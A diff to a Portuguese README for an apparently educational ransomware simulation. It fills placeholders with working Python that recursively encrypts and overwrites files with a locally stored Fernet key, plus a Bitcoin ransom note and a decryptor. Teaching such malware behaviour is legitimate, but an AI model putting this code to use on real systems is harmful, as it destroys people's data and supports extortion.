@@ -27,8 +27,15 @@ O malware percorre o sistema de arquivos mapeando arquivos de interesse — docu
 
 Nesta simulação, isso é feito pela função responsável por listar todos os arquivos do diretório atual, excluindo os scripts do próprio projeto:
 
-```
-[ # ENCONTRAR ARQUIVOS ]
+```python
+def encontrar_arquivos(diretorio):
+    lista_arquivos = []
+    for root, dirs, files in os.walk(diretorio):
+        for nome in files:
+            path = os.path.join(root, nome)
+            if nome != "main.py" and nome != "descriptografar.py" and not nome.endswith(".key"):
+                lista_arquivos.append(path)
+    return lista_arquivos
 ```
 
 ### 4. Geração e Proteção da Chave (Impact — Preparation)
@@ -36,32 +43,82 @@ Uma chave criptográfica é gerada localmente. Em ataques reais, essa chave é i
 
 Nesta simulação, para fins didáticos, a chave é armazenada localmente em `chave.key`. A biblioteca utilizada é a **Fernet**, parte do pacote `cryptography` do Python, que implementa criptografia simétrica AES-128 em modo CBC com autenticação HMAC-SHA256:
 
-```
-[ # GERAR CHAVE ]
-[ # CARREGAR CHAVE ]
+```python
+# Gerar chave de criptografia
+def gerar_chave():
+    chave = Fernet.generate_key()
+    with open("chave.key", "wb") as chave_arquivo:
+        chave_arquivo.write(chave)
+
+# Carregar chave
+def carregar_chave():
+    return open("chave.key", "rb").read()
 ```
 
 ### 5. Criptografia dos Arquivos (Impact — Data Encrypted for Impact)
 Cada arquivo encontrado é lido em modo binário, cifrado com a chave Fernet e reescrito no disco com o conteúdo criptografado. O arquivo original é sobrescrito — não há versão "antes" recuperável sem a chave:
 
-```
-[ # CRIPTOGRAFAR ARQUIVO ]
+```python
+# Criptografar arquivo
+def criptografar_arquivo(arquivo, chave):
+    chave = Fernet(chave)
+    with open(arquivo, "rb") as arq:
+        dados = arq.read()
+    dados_criptografados = chave.encrypt(dados)
+    with open(arquivo, "wb") as arq:
+        arq.write(dados_criptografados)
+
+# Encontrar arquivos para criptograr
+def encontrar_arquivos(diretorio):
+    lista_arquivos = []
+    for root, dirs, files in os.walk(diretorio):
+        for nome in files:
+            path = os.path.join(root, nome)
+            if nome != "main.py" and nome != "descriptografar.py" and not nome.endswith(".key"):
+                lista_arquivos.append(path)
+    return lista_arquivos
 ```
 
 ### 6. Entrega da Mensagem de Resgate (Impact)
 Um arquivo de texto é criado no diretório raiz, contendo as instruções de pagamento, o endereço de destino (carteira de criptomoeda) e o prazo para pagamento. Em ataques reais, esse arquivo é depositado em todas as pastas afetadas, e frequentemente a área de trabalho e o plano de fundo do sistema são alterados para exibir a mensagem:
 
-```
-[ # MENSAGEM DE RESGATE ]
+```python
+# Mensagem de resgate
+def mensagem_resgate():
+    with open("RECUPERAR OS DADOS.txt", "w") as arquivo:
+        arquivo.write('''Seus arquivos foram criptografados!
+Para recuperar seus arquivos, envie 1 Bitcoin e o comprovante para o endereço abaixo:
+a1b2d3c4e5f6...
+Após isso, será enviada a chave de descriptografia.
+Você tem 12 horas para realizar o pagamento, caso contrário, todos os dados serão permanentemente excluídos, sem possibilidade de recuperação.''')
 ```
 
 ### 7. Descriptografia (mediante fornecimento da chave)
 Em ataques reais, após confirmação do pagamento, o atacante fornece a chave ou um decryptor. Nesta simulação, o script `descriptografar.py` replica esse processo — ele lê a chave armazenada localmente e reverte a criptografia de todos os arquivos:
 
-```
-[ # CARREGAR CHAVE ]
-[ # DESCRIPTOGRAFAR ARQUIVO ]
-[ # ENCONTRAR ARQUIVOS ]
+```python
+# Carregar chave
+def carregar_chave():
+    return open("chave.key", "rb").read()
+
+# Descriptografar arquivos
+def descriptografar_arquivo(arquivo, chave):
+    chave = Fernet(chave)
+    with open(arquivo, "rb") as arq:
+        dados_criptografados = arq.read()
+        dados_descriptografados = chave.decrypt(dados_criptografados)
+    with open(arquivo, "wb") as arq:
+        arq.write(dados_descriptografados)
+
+# Encontrar arquivos para descriptografar
+def encontrar_arquivos(diretorio):
+    lista_arquivos = []
+    for root, dirs, files in os.walk(diretorio):
+        for nome in files:
+            path = os.path.join(root, nome)
+            if nome != "main.py" and nome != "RECUPERAR OS DADOS.txt" and nome != "descriptografar.py" and not nome.endswith(".key"):
+                lista_arquivos.append(path)
+    return lista_arquivos
 ```
 
 ---
